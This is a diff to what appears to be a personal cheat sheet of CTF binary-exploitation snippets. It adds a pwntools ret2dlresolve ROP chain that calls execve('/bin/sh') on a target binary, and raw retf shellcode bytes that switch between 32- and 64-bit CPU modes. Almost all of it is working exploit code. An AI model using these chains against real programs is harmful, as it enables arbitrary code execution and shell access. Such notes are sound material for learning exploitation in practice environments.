@@ -65,3 +65,28 @@ add(0x88)#4
 free(3)
 free(1)
 ```
+# _dl_runtime_resolve
+```python
+rop = ROP("./pwn")
+elf = ELF("./pwn")
+#dl = Ret2dlresolvePayload(elf,symbol='system',args=["/bin/sh"])
+dl = Ret2dlresolvePayload(elf,symbol='execve',args=["/bin/sh",0,0])
+rop.read(0,dl.data_addr)
+rop.ret2dlresolve(dl)
+#print(rop.dump())
+p.send("\0"*pad+str(rop))
+raw_input()
+p.send(dl.payload)
+```
+
+# retf
+```python
+to32='\xC7\x44\x24\x04\x23\x00\x00\x00\xCB'
+to64='\xC7\x44\x24\x04\x33\x00\x00\x00\xCB'
+# to32:                           ;;将CPU模式转换为32位
+#     mov DWORD [rsp+4],0x23      ;;32位
+#     retf
+# to64:                           ;;将CPU模式转换为64位
+#     mov DWORD [esp+4],0x33      ;;64位
+#     retf
+```
